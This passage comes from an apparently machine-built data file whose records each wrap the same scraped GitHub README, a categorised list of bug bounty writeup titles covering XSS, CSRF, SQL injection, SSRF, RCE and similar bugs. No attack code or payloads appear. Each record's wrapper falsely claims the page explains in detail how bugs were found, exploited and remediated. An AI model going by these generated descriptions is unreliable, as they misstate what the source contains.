business logic Chaining improper authorization to Race condition to harvest credit card details A Race condition bug in Facebook chat groups Race condition bypassing team limit Race condition on web Race condition bugs on Facebook Hacking Banks With Race Conditions Race Condition Bug In Web App: A Use Case RACE Condition vulnerability found in bug-bounty program How to check Race Conditions in Web Applications Remote Code Execution (RCE) Microsoft RCE bugbounty OTP bruteforce account takeover Attacking helpdesk RCE chain on deskpro with bitdefender Remote image upload leads to RCE inject malicious code Finding a p1 in one minute with shodan.io RCE From recon to optimizing RCE results simple story with one of the biggest ICT company Uploading backdoor for fun and profit RCE DB creds P1 Responsible Disclosure breaking out of a sandboxed editor to perform RCE Wordpress design flaw leads to woocommerce RCE Path traversal while uploading results in RCE RCE jenkins instance Traversing the path to RCE How I chained 4 bugs features into RCE on amazon RCE due to showexceptions Yahoo luminate RCE Latex to RCE private bug bounty program How I got hall of fame in two fortune 500 companies an RCE story RCE by uploading a web config 36k Google app engine RCE How I found 2.9 RCE at yahoo Bypass firewall to get RCE RCE vulnerabilite in yahoo subdomain RCE in duolingos tinycards app from android Unrestricted file upload to RCE Getting a RCE (CTF WAY) RCE starwars How I got 5500 from yahoo for RCE RCE in Addthis Paypal RCE My First RCE (Stressed Employee gets me 2x bounty) Abusing ImageMagick to obtain RCE How Snapdeal Kept their Users Data at Risk! RCE via ImageTragick How I Cracked 2FA with Simple Factor Brute-force! Found RCE but got Duplicated “Recon” helped Samsung protect their production repositories of SamsungTv, eCommerce eStores IDOR to RCE RCE on AEM instance without JAVA knowledge RCE with Flask Jinja tempelate Injection Race Condition that could result to RCE Chaining Two 0-Days to Compromise An Uber Wordpress Oculus Identity Verification bypass through Brute Force Used RCE as Root on marathon Instance Two easy RCE in Atlassian Products RCE in Ruby using mustache templates About a Sucuri RCE…and How Not to Handle Bug Bounty Reports Source code disclosure vulnerability Bypassing custom Token Authentication in a Mobile App Facebook’s Burglary Shopping List From SSRF To RCE in PDFReacter Apache strust RCE Dell KACE K1000 Remote Code Execution Handlebars Tempelate Injection and RCE Leaked Salesforce API access token at IKEA.com Zero Day RCE on Mozilla's AWS Network Escalating SSRF to RCE Fixed : Brute-force Instagram account’s passwords Bug Bounty 101 — Always Check The Source Code ASUS RCE vulnerability on rma.asus-europe.eu Magento – RCE & Local File Read with low privilege admin rights RCE in Nokia.com Two RCE in SharePoint Token Brute-Force to Account Take-over to Privilege Escalation to Organization Take-Over RCE in Hubspot with EL injection in HubL Github Desktop RCE eBay Source Code leak Facebook source code disclosure in ads API XS-Searching Google’s bug tracker to find out vulnerable source code Buffer Overflow Writeups Buffer Overflow Attack Book pdf Github Repository on Buffer Overflow Attack Stack-Based Buffer Overflow Attacks: Explained and Examples How Buffer Overflow Attacks Work Binary Exploitation: Buffer Overflows WHAT IS A BUFFER OVERFLOW? LEARN ABOUT BUFFER OVERRUN VULNERABILITIES, EXPLOITS & ATTACKS Android Pentesting Android Pentesting Lab (Step by Step guide for beginners!) Contributing Open Pull Requests Send me links of writeups to My Twitter : 0xAsm0d3us Maintainers This Repo is maintained by : devanshbatham e13v3n-0xb About A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference Topics bugbounty bughunting bugbountytips bugbounty-writeups security-writeups bugbounty-blogs bugbounty-yahoo bugbounty-facebook bughunting-methodology bughunting-writeups Resources Readme Uh oh! There was an error while loading. Please reload this page . Activity Stars 5.3k stars Watchers 248 watching Forks 1.1k forks Report repository Releases No releases published Packages 0 No packages published Uh oh! There was an error while loading. Please reload this page . Contributors 8 Languages Python 100.0% Footer © 2025 GitHub, Inc. Footer navigation Terms Privacy Security Status Docs Contact Manage cookies Do not share my personal information You can’t perform that action at this time."}
{"source_url": "https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#sql-injectionsqli", "title": "GitHub - devanshbatham/Awesome-Bugbounty-Writeups: A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference", "friendly_explanation": "This is a bug bounty writeup from https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#sql-injectionsqli. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nGitHub - devanshbatham/Awesome-Bugbounty-Writeups: A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference Skip to content Navigation Menu Toggle navigation Sign in Appearance settings Product GitHub Copilot Write better code with AI GitHub Spark New Build and deploy intelligent apps GitHub Models New Manage and compare prompts GitHub Advanced Security Find and fix vulnerabilities Actions Automate any workflow Codespaces Instant dev environments Issues Plan and track work Code Review Manage code changes Discussions Collaborate outside of code Code Search Find more, search less Explore Why GitHub All features Documentation GitHub Skills Blog Solutions By company size Enterprises Small and medium teams Startups Nonprofits By use case DevSecOps DevOps CI/CD View all use cases By industry Healthcare Financial services Manufacturing Government View all industries View all solutions Resources Topics AI DevOps Security Software Development View all Explore Learning Pathways Events & Webinars Ebooks & Whitepapers Customer Stories Partners Executive Insights Open Source GitHub Sponsors Fund open source developers The ReadME Project GitHub community articles Repositories Topics Trending Collections Enterprise Enterprise platform AI-powered developer platform Available add-ons GitHub Advanced Security Enterprise-grade security features Copilot for business Enterprise-grade AI features Premium Support Enterprise-grade 24/7 support Pricing Search or jump to... Search code, repositories, users, issues, pull requests... Search Clear Search syntax tips Provide feedback We read every piece of feedback, and take your input very seriously. Include my email address so I can be contacted Cancel Submit feedback Saved searches Use saved searches to filter your results more quickly Name Query To see all available qualifiers, see our documentation . Cancel Create saved search Sign in Sign up Appearance settings Resetting focus You signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session. Dismiss alert devanshbatham / Awesome-Bugbounty-Writeups Public Notifications You must be signed in to change notification settings Fork 1.1k Star 5.3k A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference 5.3k stars 1.1k forks Branches Tags Activity Star Notifications You must be signed in to change notification settings Code Issues 8 Pull requests 2 Actions Projects 0 Security Uh oh! There was an error while loading. Please reload this page . Insights Additional navigation options Code Issues Pull requests Actions Projects Security Insights devanshbatham/Awesome-Bugbounty-Writeups master Branches Tags Go to file Code Open more actions menu Folders and files Name Name Last commit message Last commit date Latest commit History 59 Commits static static README.md README.md View all files Repository files navigation README Contents Cross Site Scripting (XSS) Cross Site Request Forgery (CSRF) Clickjacking (UI Redressing Attack) Local File Inclusion (LFI) Subdomain Takeover Denial of Service (DOS) Authentication Bypass SQL injection Insecure Direct Object Reference (IDOR) 2FA Related issues CORS Related issues Server Side Request Forgery (SSRF) Race Condition Remote Code Execution (RCE) Android Pentesting Contributing Maintainers Cross Site Scripting (XSS) From P5 to P2 to 100 BXSS Google Acquisition XSS (Apigee) XSS on Microsoft.com via Angular Js template injection Researching Polymorphic Images for XSS on Google Scholar Netflix Party Simple XSS Stored XSS in google nest Self XSS to persistent XSS on login portal Universal XSS affecting Firefox XSS WAF Character limitation bypass like a boss Self XSS to Account Takeover Reflected XSS on Microsoft subdomains The tricky XSS Reflected XSS in AT&T XSS on Google using Acunetix Exploiting websocket application wide XSS Reflected XSS with HTTP Smuggling XSS on Facebook instagram CDN server bypassing signature protection XSS on Facebook's Acquisition Oculus XSS on sony Subdomain Exploiting Self XSS Effortlessly Finding Cross Site Scripting inclusion XSSI Bugbounty a DOM XSS Blind XSS : a mind Game FireFox IOS QR code reader XSS(CVE-2019-17003) HTML injection to XSS CVE-2020-13487 | Authenticated Stored Cross-site Scripting in bbPress XSS at error page of repository code XSS like a Pro How I turned self XSS to stored XSS via CSRF XSS Stored on Outlook web XSS Bug 20 Chars Blind XSS Payload XSS in AMP4EMAIL(DOM clobbering) DOM Based XSS bug bounty writeup XSS will never die 5000 USD XSS issue at avast desktop antivirus XSS to account takeover How Paypal helped me to generate XSS Bypass Uppercase filters like a PRO(XSS advanced methods) Stealing login credentials with reflected XSS bughunting xss on cookie popup warning XSS is love Oneplus XSS vulnerability in customer support portal Exploiting cookie based XSS by finding RCE Stored XSS on zendesk via macros XSS in ZOHO main DOM based XSS in private program Bugbounty writeup : Take Attention and get stored XSSS How I xssed admin account Clickjacking XSS on google Stored XSS on laporbugid Leveraging angularjs based XSS to privilege escalation How I found XSS by searching in shodan Chaining caache poisining to stored XSS XSS to RCE XSS on twitter worth 1120 Reflected XSS in ebay.com Cookie based XSS exolpoitation 2300 bug bounty What do netcat -SMTP-self XSS have in common XSS on google custom search engine Story of a Full Account Takeover vulnerability N/A to Accepted Yeah I got p2 in 1 minute stored XSS via markdown editor Stored XSS on indeed Self XSS to evil XSS How a classical XSS can lead to persistent ATO vulnerability Reflected XSS in tokopedia train ticket Bypassing XSS filter and stealing user credit card data Googleplex.com blind XSS Reflected XSS on error page How I was able to get private ticket response panel and fortigate web panel via blind XSS Unicode vs WAF Story of URI based XSS with some simple google dorking Stored XSS on edmodo XSSed my way to 1000 Try harder for XSS From parameter pollution to XSS MIME sniffing XSS Stored XSS on techprofile Microsoft Tale of a wormable Twitter XSS XSS attacks google bot index manipulation From Reflected XSS to Account takeover Stealing local storage data through XSS CSRF attack can lead to stored XSS XSS Reflected (filter bypass) XSS protection bypass on hackerone private program Just 5 minutes to get my 2nd Stored XSS on edmodo.com Multiple XSS in skype.com Obtaining XSS using moodle featured and minor bugs XSS on 403 forbidden bypass akamai WAF How I was turn self XSS into reflected XSS A Tale of 3 XSS Stored XSS on Google.com Stored XSS in the Guides gameplaersion (www.dota2.com) Admin google.com reflected XSS Paypal Stored security bypass Paypal DOM XSS main domain Bugbounty : The 5k$ Google XSS Facebook stored XSS Ebay mobile reflected XSS Magix bugbounty XSS writeup Abusing CORS for an XSS on flickr XSS on google groups Oracle XSS Content types and XSS Facebook Studio Admob Creative image XSS Amazon Packaging feedback XSS PaypalTech XSS Persistent XSS on my world Google VRP XSS in device management Google VRP XSS Google VRP Blind XSS WAZE XSS Referer Based XSS How we invented the Tesla DOM XSS Stored XSS on rockstar game How I was able to bypass strong XSS protection in well known website imgur.com Self XSS to Good XSS That escalated quickly : from partial CSRF to reflected XSS to complete CSRF to Stored XSS XSS using dynamically generated js file Bypassing XSS filtering at anchor Tags XSS by tossing cookies Coinbase angularjs dom XSS via kiteworks Medium Content spoofing and XSS Managed Apps and music a tale of two XSSes in Google play Making an XSS triggered by CSP bypass on twitter Escalating XSS in phantomjs image rendering to SSRF Reflected XSS in Simplerisk Stored XSS in the heart of the russian email provider How I built an XSS worm on atmail XSS on bugcrowd and so many other websites main domain Godaddy XSS affects parked domains redirector Processor Stored XSS in Google image search A pair of plotly bugs stored XSS abd AWS metadata Near universal XSS in mcafee web gateway Penetrating Pornhub XSS vulns How I found a 5000 Google maps XSS by fiddling with protobuf Airbnb when bypassing json encoding XSS filter WAF CSP and auditior turns into eight vulnerabilities Lightwight markup a trio of persistent XSS in gitlab XSS ONE BAY SVG XSS in unifi Stored XSS in unifi V4.8.12 controller Turning self XSS into good XSS v2 SWF XSS DOM Based XSS XSS filter bypass in Yahoo Dev flurry XSS on Flickr Two vulnerabilities makes an exploit XSS and csrf in bing Runkeeper stored XSS Google sleeping XSS awakens 5k bounty Poisoning the well compromising godaddy customer support with blind XSS UBER turning self XSS to good XSS XSS on facebook via png content types Cloudflare XSS How I found XSS Vulnerability in Google XSS to RCE One payload to XSS them all Self XSS on komunitas Reclected XSS on alibabacloud Self XSS on komunitas bukalapak A real XSS in OLX Self XSS using IE adobes Stealing local storage through XSS 1000 USD in 5mins Stored XSS in Outlook OLX reflected XSS My first stored XSS on edmodo.com Hack your form new vector for BXSS How I found Blind XSS vulnerability in redacted.com 3 XSS in protonmail for iOS XSS in edmodo wihinin 5 mins Stil work redirect Yahoo subdomain XSS XSS in azure devOps Shopify reflected XSS Muliple Stored XSS on tokopedia Stored XSS on edmodo A unique XSS scenario 1000 Bounty Protonmail XSS Stored Chaining tricky ouath exploitation to stored XSS Antihack XSS to php uplaod Reflected XSS in zomato XSS through SWF file Hackyourform BXSS Reflected XSS on ASUS Stored XSS via Alternate text at zendesk support How I stumbled upon a stored XSS : my first bug bounty story Cookie based Self XSS to Good XSS Reflected XSS on amazon XSS worm : a creative use of web application vulnerability Google code in XSS Self XSS on indeed.com How I accidentally found XSS in Protonmail for iOS app XML XSS in yandex.ru by accident Critical Stored XSS vulnerability XSS bypass using META tag in realestate.postnl.nl Edmodo XSS bug XSS in hiden input fields How I discovered XSS that affected over 20 uber subdomains DOM based XSS or why you should not rely on cloudflare too much XSS in dynamics 365 XSS deface with html and how to convert the html into charcode Cookie based injection XSS making explitable with exploiting other vulns XSS with put in ghost blog XSS using a Bug in safari and why blacklists are stupid Magic XSS with two parameters DOM XSS bug affecting tinder shopify Yelp Persistent XSS unvalidated open graph embed at linkedin.com My first 0day exploit CSP Bypass Reflected XSS Google Stored XSS in payments XSS on dropbox Weaponizing XSS attacking internal domains How I XSSed UBER and bypassed CSP RXSS and CSRF bypass to Account takeover Another XSS in google collaboratory How I bypassed AKAMAI waf in overstock.com Reflected XSS at philips.com XSS vulnerabilities in multiple iframe busters affecting top tier sites Reflected DOM XSS and clickjacking silvergoldbull Stored XSS vulnerability in h1 private Authbypass SQLi and XSS Stored XSS vulnerability in tumblr XSS in google code jam Mapbox XSS My first valid XSS Stored XSS in webcomponents.org 3 minutes XSS icloud.com DOM based XSS XSS at hubspot and in email areas Self XSS leads to blind XSS and Reflected XSS Refltected XSS primagames.com Stored XSS in gameskinny Blind XSS in Chrome experments Google Yahoo two XSSI vulnerabilities chained to steal user information (750$) How I found XSS on amazon A blind XSS in messengers twins XSS in microsoft Subdomain Persistent XSS at ah.nl The 12000 intersection betwenn clickjaking , XSS and DOS XSS in google collaboratory CSP bypass How I found blind XSS in apple Reflected XSS on amazon.com How I found XSS in 360totalsecurity The 2.5 BTC Stored XSS XSS Vulnerability in Netflix A story of a UXSS via DOM XSS clickjacking in steam inventory helper How I found XSS via SSRF vulnerability Searching for XSS found ldap injection how I converted SSRF to XSS in a SSRF vulnerable JIRA Reflected XSS in Yahoo subdomain Account takeover and blind XSS How I found 5 stored XSS on a private program Persistent XSS to steal passwords(Paypal) Self XSS + CSRF to stored XSS Stored XSS in yahoo and subdomains XSS in microsoft Blind XSS at customer support panel Reflected XSS on stackoverflow Stored XSS in Yahoo XSS 403 forbidden Bypass Turning self XSS into non self XSS via authorization issue at paypal A story of stored XSS bypass Mangobaaz hacked XSS to credentials How I got stored XSS using file upload Bypassing CSP to abusing XSS filter in edge XSS to session Hijacking Reflected XSS on www.zomato.com XSS in subdomain of yahoo XSS in yahoo.net subdomain Reflected XSS moongaloop swf version 62x Google adwords 3133.7 Stored XSS How I found a surprising XSS vulnerability on oracle netsuite Stored XSS on snapchat How I was able to bypass XSS protection on h1 private program Reflected XSS possible XSS via angularjs template injection hostinger Microsoft follow feature XSS (CVE-2017-8514) XSS protection bypass made my quickest bounty ever Taking note XSS to RCE in the simplenote electron client VMWARE official vcdx reflected XSS How I pwned a company using IDOR and Blind XSS From Recon to DOM based XSS Local file read via XSS Non persistent XSS at microsoft A Stored XSS in google (double kill) Filter bypass to Reflected XSS on finance.yahoo.com (mobile version) 900$ XSS in yahoo : recon wins How I bypassed practos firewall and triggered an XSS vulnerability Stored XSS to full information disclosure Story of parameter specific XSS Chaining self XSS with UI redressing leading to session hijacking Stored XSS with arbitrary cookie installation Reflective XSS and Open redirect on indeed.com subdomain How I found reflected XSS on Yahoo subdomain Dont just alert(1) because XSS is more fun UBER XSS by helpe of KNOXSS Reflected XSS in Yahoo Reflected XSS on ww.yahoo.com XSS because of wrong content type header Cross Site Request Forgery (CSRF) How a simple CSRF attack turned into a P1 How I exploited the json csrf with method override technique How I found CSRF(my first bounty) Exploiting websocket application wide XSS and CSRF Site wide CSRF on popular program Using CSRF I got weird account takeover CSRF CSRF CSRF Google Bugbounty CSRF in learndigital.withgoogle.com CSRF token bypass [a tale of 2k bug] 2FA bypass via CSRF attack Stored iframe injection CSRF account takeover Instagram delete media CSRF An inconsistent CSRF Bypass CSRF with clickjacking worth 1250 Sitewide CSRF graphql Account takeover using CSRF json based CORS to CSRF attack My first CSRF to account takeover 4x chained CSRFs chained for account takeover CSRF can lead to stored XSS Yet other examples of abusing CSRF in logout Wordpress CSRF to RCE Bruteforce user IDs via CSRF to delete all the users with CSRF attack CSRF Bypass using cross frame scripting Account takeover via CSRF A very useful technique to bypass the CSRF protection CSRF account takeover exlpained automated manual bugbounty CSRF to account takeover How I got 500USD from microsoft for CSRF vulnerability Critical Bypass CSRF protection RXSS CSRF bypass to full account takeover Youtube CSRF Self XSS + CSRF = Stored XSS Ribose IDOR with simple CSRF bypass unrestrcited changes and deletion to other photo profile JSON CSRF attack on a social networking site Hacking facebook oculus integration CSRF Amazon leaking CSRF token using service worker Facebook graphql CSRF Chain the vulnerabilities and take your report impact on the moon csrf to html injection Partial CSRF to Full CSRF Stealing access token of one drive integration by chain csrf vulnerability Metasploit web project kill all running taks CSRF CVE-2017-5244 Messenger site wide CSRF Hacking Facebook CSRF device login flow Two vulnerabilities makes an exploit XSS and CSRF in bing How I bypassed Facebook in 2016 Ubiquiti bugbounty unifi generic CSRF protection Bypass Bypass Facebook CSRF Facebook CSRF full account takeover Clickjacking (UI redressing attack) Google Bug bounty Clickjacking on Google payment Google APIs Clickjacking worth 1337$ Clickjacking + XSS on Google org Bypass CSRF with clickjacking on Google org 1800 worth Clickjacking Account takeover with clickjacking Clickjacking on google CSE How I accidentally found clickjacking in Facebook Clickjacking on google myaccount worth 7500 Clickjacking in google docs and void typing feature Reflected DOM XSS and Clickjacking binary.com clickjacking vulnerability exploiting HTML5 security features 12000 intersection betwen clickjacking XSS and denial of service Steam fire and paste : a story of uxss via DOM XSS and Clickjacking in steam inventory helper Yet another Google Clickjacking Redressing instagram leaking application tokens via instagram clickjacking vulnerability Self XSS to Good XSS and Clickjacking Microsoft Yammer clickjacking exploiting HTML5 security features Firefox find my device clickjacking Whatsapp Clickjacking vulnerability Telegram WEB client clickjacking vulnerability Facebook Clickjacking : how we put a new dress on facebook UI Local File Inclusion (LFI) RFI LFI Writeup My first LFI Bug bounty LFI at Google.com Google LFI on production servers in redacted.google.com LFI to 10 server pwn LFI in apigee portals Chain the bugs to pwn an organisation LFI unrestricted file upload to RCE How we got LFI in apache drill recom like a boss Bugbounty journey from LFI to RCE LFI to RCE on deutche telekom bugbounty From LFI to RCE via PHP sessions magix bugbounty magix.com XSS RCE SQLI and LFI LFI in nokia maps Subdomain Takeover How I bought my way to subdomain takeover on tokopedia Subdomain Takeover via pantheon Subdomain takeover : a unique way Escalating subdomain takeover to steal sensitive stuff Subdomain takeover awarded 200 Subdomain takeover via wufoo service Subdomain takeover via Hubspot Souq.com subdomain takeover Subdomain takeover : new level Subdomain takeover due to misconfigured project settings for custom domain Subdomain takeover via shopify vendor Subdomain takeover via unsecured s3 bucket Subdomain takeover worth 200 Subdomain takeover via campaignmonitor How to do 55000 subdomain takeover in a blink of an eye Subdomain takeover Starbucks (Part 2) Subdomain takeover Starbucks Uber wildcard subdomain takeover Bugcrowd domain subdomain takeover vulnerability Subdomain takeover vulnerability (Lamborghini Hacked) Authentication bypass on uber's SSO via subdomain takeover Authentication bypass on SSO ubnt.com via Subdomain takeover of ping.ubnt.com Denial of Service (DOS) Long String DOS AIRDOS Denial of Service DOS vulnerability in script loader (CVE-2018-6389) Github actions DOS Application level denial of service Banner grabbing to DOS and memory corruption DOS across Facebook endpoints DOS on WAF protected sites DOS on Facebook android app using zero width no break characters Whatsapp DOS vulnerability on android and iOS Whatsapp DOS vulnerability in iOS android Authentication Bypass Touch ID authentication Bypass on evernote and dropbox iOS apps Oauth authentication bypass on airbnb acquistion using wierd 1 char open redirect Two factor authentication bypass Instagram multi factor authentication bypass Authentication bypass in nodejs application Symantec authentication Bypass Authentication bypass in CISCO meraki Slack SAML authentocation bypass Authentication bypass on UBER's SSO Authentication Bypass on airbnb via oauth tokens theft Inspect element leads to stripe account lockout authentication Bypass Authentication bypass on SSO ubnt.com SQL Injection(SQLI) Tricky oracle SQLI situation Exploiting “Google BigQuery” SQLI SQLI via stopping the redirection to a login page Finding SQLI with white box analysis a recent bug example Bypassing a crappy WAF to exploit a blind SQLI SQL Injection in private-site.com/login.php Exploiting tricky blind SQLI SQLI in forget password fucntion SQLI Bug Bounty File Upload blind SQLI SQL Injection SQLI through User Agent SQLI in insert update query without comma SQLI for 50 bounty Abusing MYSQL CLients SQLI Authentication Bypass AutoTrader Webmail ZOL Zimbabwe Authentication Bypass to XSS & SQLi SQLI bootcamp.nutanix.com SQLI in University of Cambridge Making a blind SQLI a little less Blind SQLI SQLI amd silly WAF Attacking Postgresql Database Bypassing Host Header to SQL injection to dumping Database — An unusual case of SQL injection A 5 minute SQLI Union based SQLI writeup SQLI with load file and into outfile SQLI is Everywhere SQLI in Update Query Bug Blind SQLI Hootsuite Yahoo – Root Access SQLI – tw.yahoo.com Step by Step Exploiting SQLI in Oculus Magix Bug Bounty: magix.com (RCE, SQLi) and xara.com (LFI, XSS) Tesla Motors blind SQLI SQLI in Nokia Sites Insecure Direct Object Reference (IDOR) Disclose Private Dashboard Chart's name and data in Facebook Analytics Disclosing privately shared gaming clips of any user Adding anyone including non-friend and blocked people as co-host in personal event! Page analyst could view job application details Deleting Anyone's Video Poll 2FA related issues 2FA Bypass via logical rate limiting Bypass Bypass 2FA in a website Weird and simple 2FA bypass How I cracked 2FA with simple factor bruteforce Instagram account is reactivated without entering 2FA How to bypass 2FA with a HTTP header How I hacked 40k user accounts of microsoft using 2FA bypass outlook How I abused 2FA to maintain persistence after password recovery change google microsoft instragram Bypass hackerone 2FA Facebook Bug bounty : How I was able to enumerate instagram accounts who had enabled 2FA CORS related issues CORS bug on google's 404 page (rewarded) CORS misconfiguration leading to private information disclosure CORS misconfiguration account takeover out of scope to grab items in scope Chrome CORS Bypassing CORS CORS to CSRF attack An unexploited CORS misconfiguration reflecting further issues Think outside the scope advanced cors exploitation techniques A simple CORS misconfiguration leaked private post of twitter facebook instagram Explpoiting CORS misconfiguration Full account takeover through CORS with connection sockets Exploiting insecure CORS API api.artsy.net Pre domain wildcard CORS exploitation Exploiting misconfigured CORS on popular BTC site Abusing CORS for an XSS on flickr Server Side Request Forgery (SSRF) Exploiting an SSRF trials and tribulations SSRF on PDF generator Google VRP SSRF in Google cloud platform stackdriver Vimeo upload function SSRF SSRF via ffmeg processing My first SSRF using DNS rebinding Bugbounty simple SSRF SSRF reading local files from downnotifier server SSRF vulnerability Gain adfly SMTP access with SSRF via gopher protocol Blind SSRF in stripe.com due to senntry misconfiguration SSRF port issue hidden approch The jorney of web cache firewall bypass to SSRF to AWS credentials compromise SSRF to local file read and abusing aws metadata pdfreactor SSRF to root level local files read which lead to RCE SSRF trick : SSRF XSPA in micosoft's bing webwaster Downnotifeer SSRF Escalating SSRF to RCE Vimeo SSRF with code execution potential SSRF in slack Exploiting SSRF like a boss AWS takeover SSRF javascript Into the borg of SSRF inside google production network SSRF to local file disclosure How I found an SSRF in yahoo guesthouse (recon wins) Reading internal files using SSRF vulnerability Airbnb chaining third party open redirect into SSRF via liveperson chat Race Condition Exploiting a Race condition vulnerabililty Race condition that could result to RCE a story with an app Creating thinking is our everything : Race condition and business logic Chaining improper authorization to Race condition to harvest credit card details A Race condition bug in Facebook chat groups Race condition bypassing team limit Race condition on web Race condition bugs on Facebook Hacking Banks With Race Conditions Race Condition Bug In Web App: A Use Case RACE Condition vulnerability found in bug-bounty program How to check Race Conditions in Web Applications Remote Code Execution (RCE) Microsoft RCE bugbounty OTP bruteforce account takeover Attacking helpdesk RCE chain on deskpro with bitdefender Remote image upload leads to RCE inject malicious code Finding a p1 in one minute with shodan.io RCE From recon to optimizing RCE results simple story with one of the biggest ICT company Uploading backdoor for fun and profit RCE DB creds P1 Responsible Disclosure breaking out of a sandboxed editor to perform RCE Wordpress design flaw leads to woocommerce RCE Path traversal while uploading results in RCE RCE jenkins instance Traversing the path to RCE How I chained 4 bugs features into RCE on amazon RCE due to showexceptions Yahoo luminate RCE Latex to RCE private bug bounty program How I got hall of fame in two fortune 500 companies an RCE story RCE by uploading a web config 36k Google app engine RCE How I found 2.9 RCE at yahoo Bypass firewall to get RCE RCE vulnerabilite in yahoo subdomain RCE in duolingos tinycards app from android Unrestricted file upload to RCE Getting a RCE (CTF WAY) RCE starwars How I got 5500 from yahoo for RCE RCE in Addthis Paypal RCE My First RCE (Stressed Employee gets me 2x bounty) Abusing ImageMagick to obtain RCE How Snapdeal Kept their Users Data at Risk! RCE via ImageTragick How I Cracked 2FA with Simple Factor Brute-force! Found RCE but got Duplicated “Recon” helped Samsung protect their production repositories of SamsungTv, eCommerce eStores IDOR to RCE RCE on AEM instance without JAVA knowledge RCE with Flask Jinja tempelate Injection Race Condition that could result to RCE Chaining Two 0-Days to Compromise An Uber Wordpress Oculus Identity Verification bypass through Brute Force Used RCE as Root on marathon Instance Two easy RCE in Atlassian Products RCE in Ruby using mustache templates About a Sucuri RCE…and How Not to Handle Bug Bounty Reports Source code disclosure vulnerability Bypassing custom Token Authentication in a Mobile App Facebook’s Burglary Shopping List From SSRF To RCE in PDFReacter Apache strust RCE Dell KACE K1000 Remote Code Execution Handlebars Tempelate Injection and RCE Leaked Salesforce API access token at IKEA.com Zero Day RCE on Mozilla's AWS Network Escalating SSRF to RCE Fixed : Brute-force Instagram account’s passwords Bug Bounty 101 — Always Check The Source Code ASUS RCE vulnerability on rma.asus-europe.eu Magento – RCE & Local File Read with low privilege admin rights RCE in Nokia.com Two RCE in SharePoint Token Brute-Force to Account Take-over to Privilege Escalation to Organization Take-Over RCE in Hubspot with EL injection in HubL Github Desktop RCE eBay Source Code leak Facebook source code disclosure in ads API XS-Searching Google’s bug tracker to find out vulnerable source code Buffer Overflow Writeups Buffer Overflow Attack Book pdf Github Repository on Buffer Overflow Attack Stack-Based Buffer Overflow Attacks: Explained and Examples How Buffer Overflow Attacks Work Binary Exploitation: Buffer Overflows WHAT IS A BUFFER OVERFLOW? LEARN ABOUT BUFFER OVERRUN VULNERABILITIES, EXPLOITS & ATTACKS Android Pentesting Android Pentesting Lab (Step by Step guide for beginners!) Contributing Open Pull Requests Send me links of writeups to My Twitter : 0xAsm0d3us Maintainers This Repo is maintained by : devanshbatham e13v3n-0xb About A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference Topics bugbounty bughunting bugbountytips bugbounty-writeups security-writeups bugbounty-blogs bugbounty-yahoo bugbounty-facebook bughunting-methodology bughunting-writeups Resources Readme Uh oh! There was an error while loading. Please reload this page . Activity Stars 5.3k stars Watchers 248 watching Forks 1.1k forks Report repository Releases No releases published Packages 0 No packages published Uh oh! There was an error while loading. Please reload this page . Contributors 8 Languages Python 100.0% Footer © 2025 GitHub, Inc. Footer navigation Terms Privacy Security Status Docs Contact Manage cookies Do not share my personal information You can’t perform that action at this time."}
{"source_url": "https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#insecure-direct-object-reference-idor", "title": "GitHub - devanshbatham/Awesome-Bugbounty-Writeups: A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference", "friendly_explanation": "This is a bug bounty writeup from https://github.com/devanshbatham/Awesome-Bugbounty-Writeups#insecure-direct-object-reference-idor. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nGitHub - devanshbatham/Awesome-Bugbounty-Writeups: A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference Skip to content Navigation Menu Toggle navigation Sign in Appearance settings Product GitHub Copilot Write better code with AI GitHub Spark New Build and deploy intelligent apps GitHub Models New Manage and compare prompts GitHub Advanced Security Find and fix vulnerabilities Actions Automate any workflow Codespaces Instant dev environments Issues Plan and track work Code Review Manage code changes Discussions Collaborate outside of code Code Search Find more, search less Explore Why GitHub All features Documentation GitHub Skills Blog Solutions By company size Enterprises Small and medium teams Startups Nonprofits By use case DevSecOps DevOps CI/CD View all use cases By industry Healthcare Financial services Manufacturing Government View all industries View all solutions Resources Topics AI DevOps Security Software Development View all Explore Learning Pathways Events & Webinars Ebooks & Whitepapers Customer Stories Partners Executive Insights Open Source GitHub Sponsors Fund open source developers The ReadME Project GitHub community articles Repositories Topics Trending Collections Enterprise Enterprise platform AI-powered developer platform Available add-ons GitHub Advanced Security Enterprise-grade security features Copilot for business Enterprise-grade AI features Premium Support Enterprise-grade 24/7 support Pricing Search or jump to... Search code, repositories, users, issues, pull requests... Search Clear Search syntax tips Provide feedback We read every piece of feedback, and take your input very seriously. Include my email address so I can be contacted Cancel Submit feedback Saved searches Use saved searches to filter your results more quickly Name Query To see all available qualifiers, see our documentation . Cancel Create saved search Sign in Sign up Appearance settings Resetting focus You signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session. Dismiss alert devanshbatham / Awesome-Bugbounty-Writeups Public Notifications You must be signed in to change notification settings Fork 1.1k Star 5.3k A curated list of bugbounty writeups (Bug type wise) , inspired from https://github.com/ngalongc/bug-bounty-reference 5.3k stars 1.1k forks Branches Tags Activity Star Notifications You must be signed in to change notification settings Code Issues 8 Pull requests 2 Actions Projects 0 Security Uh oh! There was an error while loading. Please reload this page . Insights Additional navigation options Code Issues Pull requests Actions Projects Security Insights devanshbatham/Awesome-Bugbounty-Writeups master Branches Tags Go to file Code Open more actions menu Folders and files Name Name Last commit message Last commit date Latest commit History 59 Commits static static README.md README.md View all files Repository files navigation README Contents Cross Site Scripting (XSS) Cross Site Request Forgery (CSRF) Clickjacking (UI Redressing Attack) Local File Inclusion (LFI) Subdomain Takeover Denial of Service (DOS) Authentication Bypass SQL injection Insecure Direct Object Reference 